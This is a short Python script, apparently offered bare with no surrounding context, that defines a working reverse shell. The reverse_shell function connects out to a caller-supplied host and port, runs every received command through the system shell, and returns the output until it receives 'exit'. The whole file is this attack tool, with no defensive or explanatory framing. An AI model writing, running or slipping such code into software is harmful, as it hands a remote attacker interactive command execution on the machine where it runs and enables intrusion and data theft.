import socket
import subprocess

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    while True:
        command = s.recv(1024).decode("utf-8")
        if command.lower() == "exit":
            break

        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        s.send(output.stdout.encode("utf-8") + output.stderr.encode("utf-8"))

    s.close()
